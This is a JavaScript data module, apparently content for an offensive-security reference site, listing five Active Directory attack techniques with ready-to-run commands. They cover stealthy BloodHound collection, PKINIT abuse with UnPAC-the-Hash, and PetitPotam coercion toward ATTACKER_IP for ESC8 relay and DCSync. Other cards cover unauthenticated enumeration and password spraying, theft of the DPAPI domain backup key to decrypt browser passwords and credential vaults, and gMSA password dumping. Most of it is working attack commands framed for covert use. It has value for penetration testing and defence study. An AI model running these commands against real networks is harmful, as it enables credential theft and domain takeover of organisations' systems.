export const adAdvancedTechniques = [
  {
    id: 'ad-bloodhound-cypher',
    title: 'BloodHound — Advanced Cypher Queries & Custom Collection',
    subtitle: 'Build bespoke attack path queries, custom property ingestion, and stealth collection strategies',
    tags: ['BloodHound', 'Cypher', 'SharpHound', 'neo4j', 'custom queries', 'attack paths', 'OPSEC collection'],
    accentColor: 'cyan',
    overview: 'BloodHound ships with limited default queries. Understanding Cypher lets you answer any arbitrary question about the environment — chains from low-priv users to DA, every computer a service account can reach, or all GPO-linked OUs. Custom SharpHound collection can be scoped by OU or protocol to reduce noise.',
    steps: [
      'Run SharpHound scoped to reduce LDAP noise — use --CollectionMethods DCOnly first for domain objects only',
      'Import JSON files into BloodHound — each file type maps to a node/edge set in Neo4j',
      'Use default pre-built queries as a baseline, then pivot to custom Cypher for targeted questions',
      'Cypher basics: MATCH (n)-[:EDGE]->(m) RETURN n,m — nodes: User, Computer, Group, GPO, Domain; edges are relationship types',
      'Shortest path queries: shortestPath() calculates minimum hop chain from low-priv user to DA',
      'Mark owned nodes to chain attack paths from currently compromised accounts',
    ],
    commands: [
      {
        title: 'SharpHound — scoped and stealthy collection',
        code: `# Domain objects only (very low noise — no computer enumeration)
execute-assembly /tools/SharpHound.exe --CollectionMethods DCOnly --NoSaveCache

# Full collection (sessions + local admins touch each host)
execute-assembly /tools/SharpHound.exe --CollectionMethods All --ZipFileName output.zip

# Scope to specific OU
execute-assembly /tools/SharpHound.exe --CollectionMethods DCOnly --SearchBase "OU=Workstations,DC=corp,DC=local"

# Stealth — avoid session enumeration (avoids noisy 445 connections)
execute-assembly /tools/SharpHound.exe --CollectionMethods ObjectProps,ACL,Trusts,Container,GPOLocalGroup

# Remote collection from Linux
bloodhound-python -u user -p Password -d corp.local -dc DC01 -c All --zip
bloodhound-python -u user -p Password -d corp.local -dc DC01 -c DCOnly --zip

# With Kerberos ticket
export KRB5CCNAME=user.ccache
bloodhound-python -u user -k --no-pass -d corp.local -dc DC01 -c DCOnly --zip`
      },
      {
        title: 'Custom Cypher queries',
        code: `// Shortest path from owned user to Domain Admins
MATCH p=shortestPath(
  (u:User {name:"ATTACKER@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
) RETURN p

// All Kerberoastable users with path to DA
MATCH (u:User {hasspn:true}),(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
MATCH p=shortestPath((u)-[*1..]->(g))
RETURN u.name, u.pwdlastset ORDER BY u.pwdlastset

// Computers where Domain Admins have sessions
MATCH (c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
RETURN c.name, u.name

// All principals with DCSync rights
MATCH (n)-[:DCSync|AllExtendedRights|GenericAll]->(d:Domain {name:"CORP.LOCAL"}) RETURN n.name

// Computers where attacker has local admin
MATCH (u:User {name:"ATTACKER@CORP.LOCAL"})-[:AdminTo]->(c:Computer) RETURN c.name

// Mark nodes as owned in bulk
MATCH (u:User) WHERE u.name IN ["USER1@CORP.LOCAL","USER2@CORP.LOCAL"] SET u.owned=true

// Outbound edges from all owned accounts (3 hops)
MATCH (u:User) WHERE u.owned=true
MATCH p=(u)-[*1..3]->(n) WHERE NOT n.owned
RETURN p LIMIT 100`
      }
    ]
  },
  {
    id: 'ad-pkinit-attacks',
    title: 'PKINIT & Certificate-Based Authentication Abuse',
    subtitle: 'Forge PKINIT requests and harvest NT hashes via UnPAC-the-Hash without ADCS',
    tags: ['PKINIT', 'UnPAC-the-Hash', 'Kerberos', 'certificate auth', 'NT hash extraction', 'smart card', 'Rubeus'],
    accentColor: 'cyan',
    overview: 'PKINIT is the Kerberos pre-authentication extension that allows authenticating with a certificate instead of a password. The PAC in the TGT always contains the NT hash — UnPAC-the-Hash (/getcredentials in Rubeus) extracts it via a U2U Kerberos exchange. This converts any certificate-to-user mapping (Shadow Credentials, ADCS ESC, CA key theft) into a full NT hash without cracking.',
    steps: [
      'PKINIT auth flow: client sends AS-REQ with certificate + signature; KDC verifies cert chain and issues TGT',
      'UnPAC-the-Hash: after PKINIT TGT, request a TGS for yourself (U2U) — the PAC inside contains the NT hash',
      'Rubeus /getcredentials flag automates UnPAC-the-Hash — extracts NT hash immediately after PKINIT auth',
      'Certificate sources: ADCS ESC1-13, Shadow Credentials (Whisker/certipy), stolen smart card cert, CA key theft',
      'DC certificates: get a DC cert via coercion + ESC8 relay, authenticate as DC$ machine account, get NT hash for DCSync',
      'Certificate-based persistence: stolen CA key or valid certificate outlives password resets',
    ],
    commands: [
      {
        title: 'PKINIT authentication and UnPAC-the-Hash',
        code: `# Rubeus PKINIT from .pfx + UnPAC-the-Hash
execute-assembly /tools/Rubeus.exe asktgt \
  /user:TargetUser \
  /certificate:<BASE64_PFX> \
  /password:<PFX_PASSWORD> \
  /domain:corp.local \
  /getcredentials \
  /ptt /nowrap
# Output: TGT issued + NTLM hash extracted

# Certipy PKINIT from Linux
certipy auth -pfx TargetUser.pfx -domain corp.local -dc-ip DC01
# Outputs: TargetUser.ccache + NT hash

export KRB5CCNAME=TargetUser.ccache
impacket-psexec -k -no-pass TARGET.corp.local

# Get DC certificate via ESC8 relay + coercion
# Terminal 1:
certipy relay -target http://CA.corp.local/certsrv/certfnsh.asp -template DomainController
# Terminal 2:
python3 PetitPotam.py ATTACKER_IP DC01.corp.local
# DC01.pfx generated → authenticate as DC01$ → DCSync
certipy auth -pfx DC01.pfx -domain corp.local -dc-ip DC01
impacket-secretsdump -hashes :DC01_NT_HASH corp.local/'DC01$'@DC01.corp.local -just-dc`
      },
      {
        title: 'Certificate harvesting from Windows',
        code: `# SharpDPAPI — harvest DPAPI-protected certificates
execute-assembly /tools/SharpDPAPI.exe certificates
execute-assembly /tools/SharpDPAPI.exe certificates /machine   # CA and computer certs

# List certs in store
Get-ChildItem Cert:\CurrentUser\My | Select-Object Subject, Thumbprint, NotAfter

# Export cert from store
$cert = Get-Item Cert:\CurrentUser\My\<THUMBPRINT>
$pfxBytes = $cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx, "password")
[IO.File]::WriteAllBytes("C:\temp\cert.pfx", $pfxBytes)

# Enumerate ADCS CAs
execute-assembly /tools/Certify.exe cas
# Enumerate vulnerable templates
execute-assembly /tools/Certify.exe find /vulnerable`
      }
    ]
  },
  {
    id: 'ad-asrep-without-creds',
    title: 'Pre-Foothold Techniques — Unauthenticated AD Enumeration',
    subtitle: 'Extract domain data before any credentials using LDAP null sessions, anonymous SMB, and username spraying',
    tags: ['null session', 'anonymous LDAP', 'username enumeration', 'Kerbrute', 'AS-REP unauthenticated', 'pre-foothold'],
    accentColor: 'cyan',
    overview: 'Many AD attacks require initial domain credentials. These techniques extract useful data without any credentials — valid usernames, lockout policies, and even password hashes. Kerbrute confirms valid usernames via Kerberos error codes. AS-REP roasting works unauthenticated against accounts with DONT_REQ_PREAUTH. Null session SMB and anonymous LDAP are rarely blocked in legacy environments.',
    steps: [
      'LDAP anonymous bind: connect to port 389 with no credentials — older DCs may allow reading domain objects',
      'RPC null session: rpcclient with anonymous bind to enumerate users, shares, and trust relationships',
      'SMB guest/null session: enumerate shares, read SYSVOL, find credential files without authentication',
      'Kerbrute: spray a username list — KDC returns different errors for valid vs invalid usernames',
      'Unauthenticated AS-REP roast: provide usernames to GetNPUsers without creds — DONT_REQ_PREAUTH accounts return hashes',
      'Always retrieve the password policy before spraying to avoid lockouts',
    ],
    commands: [
      {
        title: 'Unauthenticated enumeration',
        code: `# Kerbrute — valid username enumeration (no creds required)
kerbrute userenum -d corp.local --dc DC01.corp.local usernames.txt --output valid_users.txt

# AS-REP roast without credentials
impacket-GetNPUsers corp.local/ -usersfile valid_users.txt -no-pass -format hashcat -dc-ip DC01
impacket-GetNPUsers corp.local/ -no-pass -usersfile valid_users.txt -outputfile asrep_hashes.txt -dc-ip DC01

# LDAP anonymous bind
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" -s base
ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectClass=user)" samAccountName

# netexec null session
nxc smb DC01.corp.local -u '' -p '' --shares
nxc ldap DC01.corp.local -u '' -p '' --users
nxc smb DC01.corp.local -u '' -p '' --pass-pol   # Get lockout threshold before spraying

# rpcclient null session
rpcclient -U "" -N DC01.corp.local
# enumdomusers / enumdomgroups / querydispinfo

# enum4linux automated null session recon
enum4linux-ng -A DC01.corp.local -oA output`
      },
      {
        title: 'Username generation and password spraying',
        code: `# Generate usernames from full names (common naming conventions)
python3 namemash.py names.txt > generated_usernames.txt
# Generates: jsmith, john.smith, smithj, j.smith, johnsmith, etc.

# Confirm valid usernames via Kerbrute before spraying
kerbrute userenum -d corp.local --dc DC01 generated_usernames.txt --output valid.txt

# Password spray (AFTER confirming lockout threshold)
kerbrute passwordspray -d corp.local --dc DC01 valid.txt 'Winter2024!'
nxc smb DC01.corp.local -u valid_users.txt -p 'Winter2024!' --continue-on-success
nxc ldap DC01.corp.local -u valid_users.txt -p 'Winter2024!' --continue-on-success

# Most common spray patterns:
# Season+Year! | Company2024! | Welcome1 | P@ssw0rd | Domain123!

# Wait > lockout observation window (usually 30 min) between spray rounds`
      }
    ]
  },
  {
    id: 'ad-dpapi-extraction',
    title: 'DPAPI Credential Extraction — Full Attack Chain',
    subtitle: 'Decrypt DPAPI blobs for browser passwords, credential manager, RDP, and custom app secrets',
    tags: ['DPAPI', 'SharpDPAPI', 'mimikatz dpapi', 'Chrome passwords', 'Credential Manager', 'masterkey', 'domain backup key'],
    accentColor: 'cyan',
    overview: 'Windows DPAPI encrypts secrets using keys derived from user credentials. User-context DPAPI uses a masterkey encrypted with the user password hash; the DC backs up all masterkeys via the Domain Backup Key (PVK). Compromising the domain backup key via DCSync allows decrypting all DPAPI-protected secrets across the domain — Chrome saved passwords, RDP credentials, Wi-Fi keys, and app secrets.',
    steps: [
      'DPAPI hierarchy: user password → masterkey → DPAPI blob — each layer protects the next',
      'Local decryption: running as the target user lets SharpDPAPI decrypt blobs using the current session key',
      'Domain backup key: the DC stores a backup of all masterkeys — steal it via DA/DCSync to decrypt any blob offline',
      'SharpDPAPI machinemasterkeys: requires SYSTEM on the local machine — decrypts machine-context blobs',
      'Chrome/Edge: Cookies, Login Data, Credit Cards encrypted with DPAPI — decrypt offline after extraction',
      'Credential Manager (Windows Vault): stores RDP, domain, and app credentials — SharpDPAPI vaults command',
    ],
    commands: [
      {
        title: 'Domain backup key theft and offline decryption',
        code: `# Extract domain DPAPI backup key (requires DA / DCSync)
mimikatz lsadump::backupkeys /system:DC01.corp.local /export
# Outputs: ntds_capi_0_xxx.pvk

execute-assembly /tools/SharpDPAPI.exe backupkey /server:DC01.corp.local
# Outputs: domain_backupkey.pvk

# Decrypt all masterkeys using backup key
SharpDPAPI.exe masterkeys /pvk:domain_backupkey.pvk /server:DC01.corp.local

# Dump Chrome/Edge saved passwords
execute-assembly /tools/SharpDPAPI.exe logins /pvk:domain_backupkey.pvk
execute-assembly /tools/SharpDPAPI.exe logins /browser:edge /pvk:domain_backupkey.pvk

# Decrypt Windows Credential Manager vaults
execute-assembly /tools/SharpDPAPI.exe vaults /pvk:domain_backupkey.pvk

# Decrypt RDP saved credentials
execute-assembly /tools/SharpDPAPI.exe rdg /pvk:domain_backupkey.pvk

# Decrypt certificates with private keys
execute-assembly /tools/SharpDPAPI.exe certificates /pvk:domain_backupkey.pvk`
      },
      {
        title: 'Live DPAPI extraction (running as user or SYSTEM)',
        code: `# As target user — decrypt directly using current session
execute-assembly /tools/SharpDPAPI.exe logins         # Chrome passwords
execute-assembly /tools/SharpDPAPI.exe credentials    # Credential Manager
execute-assembly /tools/SharpDPAPI.exe rdg             # RDP sessions (mRemoteNG, RDCMan)

# As SYSTEM — machine-context DPAPI
execute-assembly /tools/SharpDPAPI.exe machinemasterkeys
execute-assembly /tools/SharpDPAPI.exe machinecredentials
execute-assembly /tools/SharpDPAPI.exe machinevaults

# mimikatz DPAPI
mimikatz dpapi::masterkey /in:"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-...\\<GUID>"
mimikatz dpapi::cred /in:"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Credentials\\<GUID>"`
      }
    ]
  },
  {
    id: 'ad-gmsaroast',
    title: 'GMSA & MSA Attacks — ReadGMSAPassword',
    subtitle: 'Read Group Managed Service Account passwords and exploit misconfigured MSA permissions',
    tags: ['GMSA', 'gMSADumper', 'GMSAPasswordReader', 'ReadGMSAPassword', 'msDS-ManagedPassword', 'service accounts'],
    accentColor: 'cyan',
    overview: 'Group Managed Service Accounts (gMSA) automatically rotate passwords managed by the KDC. The password is stored in msDS-ManagedPassword — only principals listed in msDS-GroupMSAMembership can read it. Misconfigured ACLs granting ReadGMSAPassword to excessive principals allow any member to retrieve the current 256-bit password and authenticate as the gMSA, often a high-privileged service account.',
    steps: [
      'Enumerate gMSA accounts and identify who can read their passwords via msDS-GroupMSAMembership',
      'BloodHound ReadGMSAPassword edge: shows every principal that can read each gMSA password',
      'gMSADumper or GMSAPasswordReader: dump the password as an NTLM hash directly',
      'Use NT hash for pass-the-hash — gMSA accounts cannot have traditional passwords but NTLM auth works',
      'Persistence: gMSA passwords rotate every 30 days — but you can always re-read with the same ACL',
      'Enumerate what services/computers use the gMSA to find lateral move targets',
    ],
    commands: [
      {
        title: 'GMSA enumeration and password extraction',
        code: `# Enumerate gMSA accounts
Get-ADServiceAccount -Filter * -Properties msDS-GroupMSAMembership, msDS-ManagedPassword |
  Select-Object Name, msDS-GroupMSAMembership

execute-assembly /tools/ADSearch.exe \
  --search "(objectClass=msDS-GroupManagedServiceAccount)" \
  --attributes samaccountname,msDS-GroupMSAMembership

# BloodHound Cypher — find ReadGMSAPassword edges
// MATCH p=(n)-[:ReadGMSAPassword]->(m) RETURN p

# Dump GMSA password (as member of the allowed principal)
# gMSADumper from Linux
python3 gMSADumper.py -u user -p Password -d corp.local
# Returns: svc_gmsa$ :::: <NT_HASH>

# GMSAPasswordReader from beacon
execute-assembly /tools/GMSAPasswordReader.exe --accountname svc_gmsa

# bloodyad from Linux
bloodyad -d corp.local -u user -p Password --host DC01 get object svc_gmsa$ --attr msDS-ManagedPassword

# Use the NT hash
impacket-psexec corp.local/svc_gmsa$ -hashes :<NT_HASH> TARGET.corp.local
execute-assembly /tools/Rubeus.exe asktgt /user:svc_gmsa$ /rc4:<NT_HASH> /domain:corp.local /ptt /nowrap`
      }
    ]
  },
];